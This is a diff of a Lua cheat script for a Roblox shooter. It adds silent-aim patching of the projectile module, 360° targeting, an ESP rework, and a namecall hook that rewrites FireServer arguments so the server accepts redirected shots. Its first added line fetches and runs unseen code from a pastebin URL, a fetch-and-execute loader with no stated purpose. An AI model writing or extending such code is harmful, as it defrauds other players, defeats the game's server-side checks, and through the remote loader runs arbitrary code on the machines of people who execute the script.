@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))()
+
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -17,13 +19,24 @@ local open = false
 local Conns, Cleanups = {}, {}
 local function track(c) Conns[#Conns + 1] = c return c end
 local function onCleanup(f) Cleanups[#Cleanups + 1] = f end
+local errSeen = {}
+local function reportErr(tag, err)
+    local k = tag .. tostring(err)
+    if errSeen[k] then return end
+    errSeen[k] = true
+    warn("[abaddon] " .. tag .. ": " .. tostring(err))
+end
 local function hook(signal, fn)
-    return track(signal:Connect(function(...) pcall(fn, ...) end))
+    return track(signal:Connect(function(...)
+        local ok, err = pcall(fn, ...)
+        if not ok then reportErr("hook", err) end
+    end))
 end
 local function every(t, fn)
     task.spawn(function()
         while alive do
-            pcall(fn)
+            local ok, err = pcall(fn)
+            if not ok then reportErr("loop", err) end
             task.wait(t)
         end
     end)
@@ -519,10 +532,14 @@ setTab("Rage")
 local M = {}   -- общие хелперы (один top-level local, чтобы не упереться в лимит 200)
 
 local function addState(k, v) State[k] = v DEFAULTS[k] = v end
-addState("RageSkipFF", true)
+addState("RageSkipFF", false)      -- раньше true: если у всех спавн-форсфилд, целей не было вообще
+addState("RageFire", "Auto")
 addState("RageHB", false)
 addState("RageHBSize", 6)
 addState("RemoteLog", false)
+addState("Rage360", true)
+addState("RageRewrite", true)
+addState("TeamMode", "Off")
 
 local THUNDER_SOUND_ID = ""            -- сюда можно вписать rbxassetid:// со звуком грома
 local CONFIG_FILE = "abaddon_hvh.json"
@@ -543,36 +560,96 @@ do
         local ch = plr.Character
         if not ch then return end
         local hum = ch:FindFirstChildOfClass("Humanoid")
-        local root = ch:FindFirstChild("HumanoidRootPart")
-        if hum and root and hum.Health > 0 then return ch, hum, root end
+        if not hum then return end
+        local root = ch:FindFirstChild("HumanoidRootPart") or hum.RootPart or ch.PrimaryPart
+        if root and hum.Health > 0 then return ch, hum, root end
+    end
+
+    -- тимчек работает только если в игре реально есть 2+ команды
+    -- (раньше при одной общей команде все игроки считались союзниками -> ни WH, ни рейдж)
+    local multi, teamT = 0, 0
+    -- сколько команд с 2+ игроками (в FFA с одной командой + наблюдателями будет < 2)
+    function M.teamsInUse()
+        if os.clock() - teamT > 1 then
+            teamT = os.clock()
+            local counts = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                local t = p.Team
+                if t then counts[t] = (counts[t] or 0) + 1 end
+            end
+            multi = 0
+            for _, n in pairs(counts) do if n >= 2 then multi += 1 end end
+        end
+        return multi
     end
 
     function M.isEnemy(plr)
         if plr == LP then return false end
-        if State.TeamCheck and LP.Team and plr.Team and plr.Team == LP.Team then return false end
+        if State.TeamMode == "On" then
+            local lt = LP.Team
+            return not (lt and plr.Team == lt)
+        end
         return true
     end
 
-    local R6 = { "Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }
-    function M.pickPart(ch, mode, ref)
-        if mode == "Head" then return ch:FindFirstChild("Head") end
-        if mode == "Torso" then return ch:FindFirstChild("Torso") or ch:FindFirstChild("HumanoidRootPart") end
-        if mode == "Root" then return ch:FindFirstChild("HumanoidRootPart") end
-        if mode == "Random" then
-            return ch:FindFirstChild(R6[math.random(#R6)]) or ch:FindFirstChild("HumanoidRootPart")
+    function M.plrFromInstance(inst)
+        local m = inst
+        while m and m ~= workspace do
+            if m:IsA("Model") then
+                local p = Players:GetPlayerFromCharacter(m)
+                if p then return p end
+            end
+            m = m.Parent
         end
+    end
+
+    -- части тела ищем и по точным именам (R6/R15), и по подстроке в имени
+    local function findPart(ch, exact, hint)
+        for _, n in ipairs(exact) do
+            local p = ch:FindFirstChild(n)
+            if p and p:IsA("BasePart") then return p end
+        end
+        for _, p in ipairs(ch:GetChildren()) do
+            if p:IsA("BasePart") and p.Name:lower():find(hint, 1, true) then return p end
+        end
+    end
+    local HEAD_N  = { "Head" }
+    local TORSO_N = { "UpperTorso", "Torso", "LowerTorso" }
+
+    -- все видимые части, лежащие прямо в модели (без аксессуаров), любые имена
+    function M.bodyParts(ch)
+        local list = {}
+        for _, p in ipairs(ch:GetChildren()) do
+            if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" and p.Transparency < 1 then
+                list[#list + 1] = p
+            end
+        end
+        return list
+    end
+
+    function M.pickPart(ch, mode, ref)
+        local root = ch:FindFirstChild("HumanoidRootPart") or ch.PrimaryPart
+        if mode == "Head" then
+            return findPart(ch, HEAD_N, "head") or findPart(ch, TORSO_N, "torso") or root
+        end
+        if mode == "Torso" then return findPart(ch, TORSO_N, "torso") or root end
+        if mode == "Root" then return root end
+        local list = M.bodyParts(ch)
+        if #list == 0 then return root end
+        if mode == "Random" then return list[math.random(#list)] end
         local c = M.cam()
         local best, bd
-        for _, n in ipairs(R6) do
-            local p = ch:FindFirstChild(n)
-            if p then
-                local sp = c:WorldToViewportPoint(p.Position)
+        for _, p in ipairs(list) do
+            local sp = c:WorldToViewportPoint(p.Position)
+            if sp.Z > 0 then
                 local d = (Vector2.new(sp.X, sp.Y) - ref).Magnitude
                 if not bd or d < bd then best, bd = p, d end
             end
         end
-        return best
+        return best or root
     end
+
+    local rp = RaycastParams.new()
 
     local rp = RaycastParams.new()
     rp.FilterType = Enum.RaycastFilterType.Exclude
@@ -595,9 +672,11 @@ do
     end
 
     -- o: fov, hitbox, sort, visible, ref(Vector2), skipFF
+    -- o: fov, hitbox, sort, visible, ref(Vector2), skipFF, all (360: без FOV и без проверки "перед камерой")
     function M.findTarget(o)
         local c = M.cam()
         if not c then return end
+        local look = c.CFrame.LookVector
         local best, bs
         for _, plr in ipairs(Players:GetPlayers()) do
             if M.isEnemy(plr) then
@@ -606,17 +685,19 @@ do
                     local part = M.pickPart(ch, o.hitbox, o.ref)
                     if part then
                         local sp = c:WorldToViewportPoint(part.Position)
-                        if sp.Z > 0 then
-                            local d2 = (Vector2.new(sp.X, sp.Y) - o.ref).Magnitude
-                            if d2 <= o.fov and (not o.visible or M.visible(part, ch)) then
-                                local dist = (part.Position - c.CFrame.Position).Magnitude
-                                local score = d2
-                                if o.sort == "Closest Distance" then score = dist
-                                elseif o.sort == "Lowest Health" then score = hum.Health
-                                elseif o.sort == "Highest Health" then score = -hum.Health end
-                                if not bs or score < bs then
-                                    best, bs = { plr = plr, ch = ch, hum = hum, root = root, part = part, dist = dist }, score
-                                end
+                        local d2 = (Vector2.new(sp.X, sp.Y) - o.ref).Magnitude
+                        if (o.all or (sp.Z > 0 and d2 <= o.fov)) and (not o.visible or M.visible(part, ch)) then
+                            local off = part.Position - c.CFrame.Position
+                            local dist = off.Magnitude
+                            local score = d2
+                            if o.all then
+                                score = dist > 0.01 and math.deg(math.acos(math.clamp(look:Dot(off.Unit), -1, 1))) or 0
+                            end
+                            if o.sort == "Closest Distance" then score = dist
+                            elseif o.sort == "Lowest Health" then score = hum.Health
+                            elseif o.sort == "Highest Health" then score = -hum.Health end
+                            if not bs or score < bs then
+                                best, bs = { plr = plr, ch = ch, hum = hum, root = root, part = part, dist = dist }, score
                             end
                         end
                     end
@@ -637,7 +718,8 @@ do
 
     -- стрельба через игровой SignalManager (так же, как ContextAction игры)
     function M.fireWeapon(state)
-        if M.SM then pcall(M.SM.Fire, "FireWeapon", state) return end
+        local method = State.RageFire
+        if M.SM and method ~= "Click" then pcall(M.SM.Fire, "FireWeapon", state) return end
         local c = M.cam()
         if not c then return end
         local vs = c.ViewportSize
@@ -664,13 +746,13 @@ do
         if not c then return end
         local t = M.findTarget({
             fov = State.RageFOV, hitbox = State.RageHitbox, sort = State.RageTarget,
-            visible = State.RageVisible, ref = c.ViewportSize / 2, skipFF = State.RageSkipFF,
+            visible = State.RageVisible, ref = c.ViewportSize / 2, skipFF = State.RageSkipFF, all = State.Rage360,
         })
         local now = os.clock()
         M.rageT, M.rageTime = t, now
         if t then
             lastSeen = now
-            if State.RageAutoFire and now - lastFire >= State.RageDelay / 1000 then
+            if State.RageAutoFire and now - lastFire >= math.max(State.RageDelay / 1000, 0.05) then
                 lastFire = now
                 M.shoot()
             end
@@ -683,8 +765,10 @@ do
     pcall(function()
         RunService:BindToRenderStep("AbaddonRageCam", Enum.RenderPriority.Camera.Value + 1, function()
             pcall(function()
-                if not State.RageOn or open or State.RageMode == "Silent" then return end
+                if not State.RageOn or open then return end
+                if State.RageMode == "Silent" and M.silentOk then return end   -- патч не встал -> целимся камерой
                 local t = M.rageT
+                
                 if not t or os.clock() - M.rageTime > 0.2 or not t.part.Parent then return end
                 local c = M.cam()
                 local pos = t.part.Position
@@ -729,24 +813,8 @@ do
         end
     end
 
-    function M.redirect(self, origin, target, speed)
-        if not (State.RageOn and State.RageMode ~= "Camera") then return end
-        if typeof(origin) ~= "Vector3" or type(speed) ~= "number" or speed <= 0 then return end
-        local ch, _, root = M.charParts(LP)
-        if not ch or (origin - root.Position).Magnitude > 16 then return end   -- только наши выстрелы
-        local t = M.rageT
-        if not t or os.clock() - M.rageTime > 0.25 or not t.part.Parent then
-            local c = M.cam()
-            if not c then return end
-            t = M.findTarget({
-                fov = State.RageFOV, hitbox = State.RageHitbox, sort = State.RageTarget,
-                visible = State.RageVisible, ref = c.ViewportSize / 2, skipFF = State.RageSkipFF,
-            })
-        end
-        if not t then return end
-        local spd = speed * 20.224489795918366
-        local g = type(self.Gravity) == "number" and self.Gravity or 0
-        local w = typeof(self.Wind) == "Vector3" and self.Wind or Vector3.zero
+        -- точка, в которую нужно стрелять: скорость пули, гравитация, ветер, движение цели
+    function M.solve(origin, t, spd, g, w)
         local a = Vector3.new(w.X, -g * workspace.Gravity, w.Z)
         local vel = State.RagePredict and t.part.AssemblyLinearVelocity or Vector3.zero
         local T = t.part.Position
@@ -756,8 +824,77 @@ do
             tt = d.Magnitude / spd
         end
         local d = (T + vel * tt) - origin - a * (0.5 * tt * tt)
-        if d.Magnitude < 0.05 then return end
+        if d.Magnitude < 0.05 then return nil end
         return origin + d
+    end
+
+    function M.currentTarget()
+        local t = M.rageT
+        if t and os.clock() - M.rageTime <= 0.25 and t.part.Parent then return t end
+        local c = M.cam()
+        if not c then return end
+        return M.findTarget({
+            fov = State.RageFOV, hitbox = State.RageHitbox, sort = State.RageTarget,
+            visible = State.RageVisible, ref = c.ViewportSize / 2, skipFF = State.RageSkipFF, all = State.Rage360,
+        })
+    end
+
+    function M.redirect(self, origin, target, speed)
+        if not (State.RageOn and State.RageMode ~= "Camera") then return end
+        if typeof(origin) ~= "Vector3" or type(speed) ~= "number" or speed <= 0 then return end
+        local ch, _, root = M.charParts(LP)
+        if not ch or (origin - root.Position).Magnitude > 16 then return end   -- только наши выстрелы
+        local t = M.currentTarget()
+        if not t then return end
+        local spd = speed * 20.224489795918366
+        local g = type(self.Gravity) == "number" and self.Gravity or 0
+        local w = typeof(self.Wind) == "Vector3" and self.Wind or Vector3.zero
+        M.lastCast = { spd = spd, g = g, w = w, time = os.clock() }
+        return M.solve(origin, t, spd, g, w)
+    end
+
+    -- переписывает аргументы fire-ремоутов, чтобы сервер видел тот же выстрел, что и клиентский снаряд.
+    -- ищет векторы, совпадающие с исходным направлением взгляда (точка, направление или скорость*направление)
+    function M.rewriteArgs(a)
+        local c = M.cam()
+        local ch, _, root = M.charParts(LP)
+        if not (c and ch) then return false end
+        local t = M.currentTarget()
+        if not t then return false end
+        local look = c.CFrame.LookVector
+
+        local origin
+        for i = 1, a.n do
+            local v = a[i]
+            if typeof(v) == "Vector3" and v.Magnitude > 1.5 and (v - root.Position).Magnitude < 16 then origin = v break end
+        end
+        origin = origin or (root.Position + Vector3.new(0, 1.5, 0))
+
+        local lc = M.lastCast
+        local fresh = lc and os.clock() - lc.time < 10
+        local tp = M.solve(origin, t, fresh and lc.spd or 1e5, fresh and lc.g or 0, fresh and lc.w or Vector3.zero)
+        if not tp then return false end
+        local newDir = (tp - origin).Unit
+
+        local changed = false
+        for i = 1, a.n do
+            local v = a[i]
+            local tv = typeof(v)
+            if tv == "Vector3" then
+                local m = v.Magnitude
+                local d = v - origin
+                if d.Magnitude > 3 and d.Unit:Dot(look) > 0.97 and (v - root.Position).Magnitude > 16 then
+                    a[i], changed = tp, true                    -- точка прицеливания
+                elseif m > 0.2 and (v / m):Dot(look) > 0.97 then
+                    a[i], changed = newDir * m, true            -- направление (единичное или с множителем скорости)
+                end
+            elseif tv == "CFrame" then
+                if v.LookVector:Dot(look) > 0.97 then
+                    a[i], changed = CFrame.lookAt(v.Position, v.Position + newDir), true
+                end
+            end
+        end
+        return changed
     end
 
     function M.ensureSilent()
@@ -767,7 +904,7 @@ do
         task.spawn(function()
             local t, m = search()
             searching = false
-            if not t then logWarn("Silent: projectile module not found, use Camera mode") return end
+            if not t then logWarn("Silent: module not found, using camera aim instead") return end
             local old = t.Cast
             mod, orig = t, old
             t.Cast = function(self, p6, origin, target, speed)
@@ -778,6 +915,7 @@ do
                 return old(self, p6, origin, target, speed)
             end
             patched = true
+            M.silentOk = true
             logOk("Silent: patched " .. m.Name)
         end)
     end
@@ -800,8 +938,7 @@ do
         local sz, seen = State.RageHBSize, {}
         for _, plr in ipairs(Players:GetPlayers()) do
             if M.isEnemy(plr) and plr.Character then
-                for _, n in ipairs({ "Head", "HumanoidRootPart" }) do
-                    local p = plr.Character:FindFirstChild(n)
+                for _, p in ipairs({ M.pickPart(plr.Character, "Head"), M.pickPart(plr.Character, "Root") }) do
                     if p then
                         seen[p] = true
                         if not saved[p] then saved[p] = { Size = p.Size, Transparency = p.Transparency, CanCollide = p.CanCollide } end
@@ -867,7 +1004,7 @@ do
 
         -- pitch: наклон торса через RootJoint (R6)
         local pm = State.AAPitch
-        local j = root:FindFirstChild("RootJoint")
+        local j = ch:FindFirstChild("RootJoint", true)
         if pm ~= "None" and j and j:IsA("Motor6D") then
             if rj ~= j then rj, rjC0 = j, j.C0 end
             local p
@@ -964,7 +1101,7 @@ do
     local function legitStep(dt)
         local c = M.cam()
         if not c then return end
-        local mouse = UIS:GetMouseLocation()
+        local mouse = c.ViewportSize / 2   -- в шутере курсор залочен, GetMouseLocation даёт мусор
         circ.Visible = State.LegitOn and State.LegitDraw and not open
         if circ.Visible then
             circ.Size = UDim2.fromOffset(State.LegitFOV * 2, State.LegitFOV * 2)
@@ -999,8 +1136,7 @@ do
             local res = workspace:Raycast(ray.Origin, ray.Direction * 2000, rp)
             local hit = false
             if res then
-                local m = res.Instance:FindFirstAncestorOfClass("Model")
-                local plr = m and Players:GetPlayerFromCharacter(m)
+                local plr = M.plrFromInstance(res.Instance)
                 hit = plr ~= nil and M.isEnemy(plr) and (M.charParts(plr)) ~= nil
             end
             local now = os.clock()
@@ -1016,7 +1152,10 @@ do
         end
     end
     pcall(function()
-        RunService:BindToRenderStep("AbaddonLegit", Enum.RenderPriority.Camera.Value + 1, function(dt) pcall(legitStep, dt) end)
+        RunService:BindToRenderStep("AbaddonLegit", Enum.RenderPriority.Camera.Value + 1, function(dt)
+            local ok, err = pcall(legitStep, dt)
+            if not ok then reportErr("legit", err) end
+        end)
     end)
     onCleanup(function() pcall(function() RunService:UnbindFromRenderStep("AbaddonLegit") end) end)
 end
@@ -1054,7 +1193,7 @@ do
     end
     local function hide(o)
         o.outline.Visible, o.box.Visible, o.name.Visible, o.info.Visible, o.hpBg.Visible, o.line.Visible = false, false, false, false, false, false
-        if o.hl then o.hl.Adornee = nil end
+        if o.hl then o.hl.Enabled = false end
     end
     local function kill(o)
         for _, k in ipairs({ "outline", "box", "name", "info", "hpBg", "line", "hl" }) do
@@ -1064,77 +1203,102 @@ do
     hook(Players.PlayerRemoving, function(p) if objs[p] then kill(objs[p]) objs[p] = nil end end)
     onCleanup(function() for _, o in pairs(objs) do kill(o) end pcall(function() layer:Destroy() end) end)
 
+    local HL_CAP = 15
+
+    local function draw(plr, c, vs, col, hlOk)
+        local ch, hum, root = M.charParts(plr)
+        if not ch then return false end
+        local head = ch:FindFirstChild("Head")
+        local dist = (root.Position - c.CFrame.Position).Magnitude
+        if dist > State.ESPMax then return false end
+        if State.ESPVisOnly and head and not M.visible(head, ch) then return false end
+
+        local o = objs[plr]
+        if not o then o = mk() objs[plr] = o end
+
+        local tp = c:WorldToViewportPoint((head and head.Position or root.Position) + Vector3.new(0, 0.7, 0))
+        local bp = c:WorldToViewportPoint(root.Position - Vector3.new(0, 3.1, 0))
+        if tp.Z > 0 and bp.Z > 0 then
+            local h = math.abs(bp.Y - tp.Y)
+            local w = h * 0.55
+            local cx, y0 = (tp.X + bp.X) / 2, math.min(tp.Y, bp.Y)
+            local x0 = cx - w / 2
+            o.outline.Visible, o.box.Visible = State.ESPBox, State.ESPBox
+            o.outline.Position, o.box.Position = UDim2.fromOffset(x0, y0), UDim2.fromOffset(x0, y0)
+            o.outline.Size, o.box.Size = UDim2.fromOffset(w, h), UDim2.fromOffset(w, h)
+            o.stroke.Color = col
+            o.name.Visible = State.ESPName
+            o.name.Text = plr.DisplayName
+            o.name.Position = UDim2.fromOffset(cx, y0 - 2)
+            o.info.Visible = State.ESPDist
+            o.info.Text = math.floor(dist) .. "m"
+            o.info.Position = UDim2.fromOffset(cx, y0 + h + 2)
+            o.hpBg.Visible = State.ESPHealth
+            o.hpBg.Position = UDim2.fromOffset(x0 - 5, y0 - 1)
+            o.hpBg.Size = UDim2.fromOffset(3, h + 2)
+            local frac = math.clamp(hum.Health / math.max(1, hum.MaxHealth), 0, 1)
+            o.hp.AnchorPoint = Vector2.new(0, 1)
+            o.hp.Position = UDim2.new(0, 1, 1, -1)
+            o.hp.Size = UDim2.new(1, -2, frac, -2)
+            o.hp.BackgroundColor3 = Color3.fromHSV(frac * 0.33, 1, 1)
+            if State.ESPTracers then
+                local ox, oy = vs.X / 2, vs.Y
+                local dx, dy = cx - ox, (y0 + h) - oy
+                o.line.Visible = true
+                o.line.BackgroundColor3 = col
+                o.line.Size = UDim2.fromOffset(math.sqrt(dx * dx + dy * dy), 1)
+                o.line.Position = UDim2.fromOffset((ox + cx) / 2, (oy + y0 + h) / 2)
+                o.line.Rotation = math.deg(math.atan2(dy, dx))
+            else
+                o.line.Visible = false
+            end
+        else
+            o.outline.Visible, o.box.Visible, o.name.Visible, o.info.Visible, o.hpBg.Visible, o.line.Visible = false, false, false, false, false, false
+        end
+
+        local usedHl = false
+        if State.ESPChams and hlOk then
+            if not o.hl or not o.hl.Parent then
+                if o.hl then pcall(function() o.hl:Destroy() end) end
+                o.hl = new("Highlight", { Name = "AbaddonHL" }, ScreenGui)
+            end
+            o.hl.Enabled = true
+            o.hl.Adornee = ch
+            o.hl.FillColor, o.hl.OutlineColor = col, col
+            o.hl.FillTransparency = State.ESPFill / 100
+            o.hl.OutlineTransparency = 0
+            o.hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            usedHl = true
+        elseif o.hl then
+            o.hl.Enabled = false
+        end
+        return usedHl and "hl" or true
+    end
+
     hook(RunService.RenderStepped, function()
         local c = M.cam()
         local used = {}
         if State.ESP and c then
             local vs = c.ViewportSize
             local col = colorOf(State.ESPColor)
-            local hlN = 0
+            local list = {}
             for _, plr in ipairs(Players:GetPlayers()) do
                 if M.isEnemy(plr) then
-                    local ch, hum, root = M.charParts(plr)
-                    if ch then
-                        local head = ch:FindFirstChild("Head")
-                        local dist = (root.Position - c.CFrame.Position).Magnitude
-                        local vis = true
-                        if State.ESPVisOnly and head then vis = M.visible(head, ch) end
-                        if dist <= State.ESPMax and vis then
-                            local o = objs[plr]
-                            if not o then o = mk() objs[plr] = o end
-                            used[plr] = true
-                            local tp = c:WorldToViewportPoint((head and head.Position or root.Position) + Vector3.new(0, 0.7, 0))
-                            local bp = c:WorldToViewportPoint(root.Position - Vector3.new(0, 3.1, 0))
-                            if tp.Z > 0 and bp.Z > 0 then
-                                local h = math.abs(bp.Y - tp.Y)
-                                local w = h * 0.55
-                                local cx, y0 = (tp.X + bp.X) / 2, math.min(tp.Y, bp.Y)
-                                local x0 = cx - w / 2
-                                o.outline.Visible, o.box.Visible = State.ESPBox, State.ESPBox
-                                o.outline.Position, o.box.Position = UDim2.fromOffset(x0, y0), UDim2.fromOffset(x0, y0)
-                                o.outline.Size, o.box.Size = UDim2.fromOffset(w, h), UDim2.fromOffset(w, h)
-                                o.stroke.Color = col
-                                o.name.Visible = State.ESPName
-                                o.name.Text = plr.DisplayName
-                                o.name.Position = UDim2.fromOffset(cx, y0 - 2)
-                                o.info.Visible = State.ESPDist
-                                o.info.Text = math.floor(dist) .. "m"
-                                o.info.Position = UDim2.fromOffset(cx, y0 + h + 2)
-                                o.hpBg.Visible = State.ESPHealth
-                                o.hpBg.Position = UDim2.fromOffset(x0 - 5, y0 - 1)
-                                o.hpBg.Size = UDim2.fromOffset(3, h + 2)
-                                local frac = math.clamp(hum.Health / math.max(1, hum.MaxHealth), 0, 1)
-                                o.hp.AnchorPoint = Vector2.new(0, 1)
-                                o.hp.Position = UDim2.new(0, 1, 1, -1)
-                                o.hp.Size = UDim2.new(1, -2, frac, -2)
-                                o.hp.BackgroundColor3 = Color3.fromHSV(frac * 0.33, 1, 1)
-                                if State.ESPTracers then
-                                    local ox, oy = vs.X / 2, vs.Y
-                                    local dx, dy = cx - ox, (y0 + h) - oy
-                                    o.line.Visible = true
-                                    o.line.BackgroundColor3 = col
-                                    o.line.Size = UDim2.fromOffset(math.sqrt(dx * dx + dy * dy), 1)
-                                    o.line.Position = UDim2.fromOffset((ox + cx) / 2, (oy + y0 + h) / 2)
-                                    o.line.Rotation = math.deg(math.atan2(dy, dx))
-                                else
-                                    o.line.Visible = false
-                                end
-                            else
-                                o.outline.Visible, o.box.Visible, o.name.Visible, o.info.Visible, o.hpBg.Visible, o.line.Visible = false, false, false, false, false, false
-                            end
-                            if State.ESPChams and hlN < 30 then
-                                hlN += 1
-                                if not o.hl then o.hl = new("Highlight", {}, ScreenGui) end
-                                o.hl.Adornee = ch
-                                o.hl.FillColor, o.hl.OutlineColor = col, col
-                                o.hl.FillTransparency = State.ESPFill / 100
-                                o.hl.OutlineTransparency = 0
-                                o.hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                            elseif o.hl then
-                                o.hl.Adornee = nil
-                            end
-                        end
+                    local r = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+                    list[#list + 1] = { plr = plr, d = r and (r.Position - c.CFrame.Position).Magnitude or 1e9 }
+                end
+            end
+            table.sort(list, function(a, b) return a.d < b.d end)
+            local hlN = 0
+            for _, e in ipairs(list) do
+                local ok, res = pcall(draw, e.plr, c, vs, col, hlN < HL_CAP)
+                if ok then
+                    if res then
+                        used[e.plr] = true
+                        if res == "hl" then hlN += 1 end
                     end
+                else
+                    reportErr("esp", res)
                 end
             end
         end
@@ -1556,8 +1720,9 @@ do -- watermark
     end)
 end
 
-do -- remote logger: помогает увидеть аргументы CheckFire / ProjectileRender / CheckShot / ProjectileFinished / GunShot
+do -- remote logger + переписывание fire-ремоутов
     local NAMES = { CheckFire = true, ProjectileRender = true, CheckShot = true, ProjectileFinished = true, GunShot = true }
+    local REWRITE = { CheckFire = true, ProjectileRender = true }
     local function fmt(v)
         local t = typeof(v)
         if t == "string" then return '"' .. v:sub(1, 24) .. '"' end
@@ -1565,30 +1730,42 @@ do -- remote logger: помогает увидеть аргументы CheckFir
         if t == "number" then return string.format("%.3g", v) end
         return t .. ":" .. tostring(v):sub(1, 24)
     end
-    _G.AbaddonRL = function(self, ...)
-        if not alive or not State.RemoteLog then return end
-        if typeof(self) ~= "Instance" or not NAMES[self.Name] then return end
+
+    _G.AbaddonRL = nil   -- хук старой версии вызывает _G.AbaddonRL, отключаем его
+    _G.AbaddonRW = function(self, ...)
+        if not alive or typeof(self) ~= "Instance" then return nil end
+        local name = self.Name
+        if not NAMES[name] then return nil end
         local a = table.pack(...)
-        local nm = self.Name
-        task.defer(function()
+        local rewritten = false
+        if REWRITE[name] and State.RageOn and State.RageRewrite and State.RageMode ~= "Camera" then
+            local ok, ch = pcall(M.rewriteArgs, a)
+            rewritten = ok and ch or false
+        end
+        if State.RemoteLog then
             local out = {}
             for i = 1, math.min(a.n, 8) do out[i] = fmt(a[i]) end
-            local line = nm .. "(" .. table.concat(out, ", ") .. ")"
-            print("[remote] " .. line)
-            log(line, rgb(150, 170, 255))
-        end)
+            local line = name .. "(" .. table.concat(out, ", ") .. ")" .. (rewritten and " [rewritten]" or "")
+            task.defer(function()
+                print("[remote] " .. line)
+                log(line, rgb(150, 170, 255))
+            end)
+        end
+        if rewritten then return a end
+        return nil
     end
-    onCleanup(function() _G.AbaddonRL = nil end)
+    onCleanup(function() _G.AbaddonRW = nil end)
 
     M.remoteHookOk = hookmetamethod ~= nil and getnamecallmethod ~= nil
-    if M.remoteHookOk and not _G.AbaddonRLHook then
-        _G.AbaddonRLHook = true
+    if M.remoteHookOk and _G.AbaddonRLHookV ~= 2 then
+        _G.AbaddonRLHookV = 2
         local old
         local function f(self, ...)
             local m = getnamecallmethod()
-            if m == "FireServer" and _G.AbaddonRL and not (checkcaller and checkcaller()) then
-                pcall(_G.AbaddonRL, self, ...)
+            if m == "FireServer" and _G.AbaddonRW and not (checkcaller and checkcaller()) then
+                local ok, res = pcall(_G.AbaddonRW, self, ...)
                 if setnamecallmethod then setnamecallmethod(m) end
+                if ok and res then return old(self, table.unpack(res, 1, res.n)) end
             end
             return old(self, ...)
         end
@@ -1616,17 +1793,20 @@ end
 do -- RAGE
     local s = section(RagePage, "Aimbot")
     toggle(s, "Enabled", "RageOn", function() M.ensureSilent() end)
+    toggle(s, "360° targeting (ignore FOV, shoot behind you)", "Rage360")
+    toggle(s, "Rewrite fire remotes (fixes phantom hits)", "RageRewrite")
     dropdown(s, "Mode", { "Silent", "Camera", "Hybrid" }, "RageMode", function() M.ensureSilent() end)
     dropdown(s, "Hitbox", { "Head", "Torso", "Root", "Closest", "Random" }, "RageHitbox")
     dropdown(s, "Target priority", { "Closest FOV", "Closest Distance", "Lowest Health", "Highest Health" }, "RageTarget")
     slider(s, "FOV (px)", 20, 2000, "RageFOV")
     toggle(s, "Visible check", "RageVisible")
     toggle(s, "Predict movement + bullet drop", "RagePredict")
-    toggle(s, "Ignore forcefield", "RageSkipFF")
+    toggle(s, "Skip players with forcefield", "RageSkipFF")
     info(s, "Silent: the projectile module's Cast is patched so shots fly at the target. Camera: view snaps to the target. Hybrid: both.", 40)
 
     s = section(RagePage, "Auto fire")
-    toggle(s, "Auto-Fire", "RageAutoFire")
+    toggle(s, "Auto fire", "RageAutoFire")
+    dropdown(s, "Fire method", { "Auto", "Click", "SignalManager" }, "RageFire")
     slider(s, "Delay (ms)", 0, 500, "RageDelay")
     toggle(s, "Auto reload when no target", "RageAutoReload")
 
@@ -1649,6 +1829,40 @@ do -- RAGE
     s = section(RagePage, "Camera")
     toggle(s, "Third person", "ThirdPerson")
     slider(s, "Distance", 3, 40, "TPDistance")
+
+    s = section(RagePage, "Debug")
+    local dbg = info(s, "...", 54)
+    every(0.3, function()
+        local others, withChar, alive, enemy, ff, noHead = 0, 0, 0, 0, 0, 0
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP then
+                others += 1
+                if p.Character then withChar += 1 end
+                local ch = M.charParts(p)
+                if ch then
+                    alive += 1
+                    if M.isEnemy(p) then enemy += 1 end
+                    if ch:FindFirstChildOfClass("ForceField") then ff += 1 end
+                    if not ch:FindFirstChild("Head") then noHead += 1 end
+                end
+            end
+        end
+        local t = M.rageT
+        dbg.Text = string.format(
+            "others %d | char %d | alive %d | enemies %d | ff %d | no 'Head' %d\nteams: %d | silent patch: %s | target: %s",
+            others, withChar, alive, enemy, ff, noHead, M.teamsInUse(),
+            tostring(M.silentOk == true), t and t.plr.Name or "none")
+    end)
+    button(s, "Dump players' body parts (F9 console)", function()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then
+                local names = {}
+                for _, d in ipairs(p.Character:GetChildren()) do names[#names + 1] = d.Name .. ":" .. d.ClassName end
+                print(("[abaddon] %s (team %s): %s"):format(p.Name, tostring(p.Team), table.concat(names, ", ")))
+            end
+        end
+        logOk("Dumped to console")
+    end)
 end
 
 do -- LEGIT
@@ -1662,7 +1876,7 @@ do -- LEGIT
     toggle(s, "Predict movement", "LegitPredict")
     toggle(s, "Sticky target", "LegitSticky")
     toggle(s, "Draw FOV circle", "LegitDraw")
-    toggle(s, "Team check (aimbots, trigger, ESP)", "TeamCheck")
+    dropdown(s, "Team check", { "Off", "On" }, "TeamMode")
 
     s = section(LegitPage, "Triggerbot")
     toggle(s, "Enabled", "Trigger")
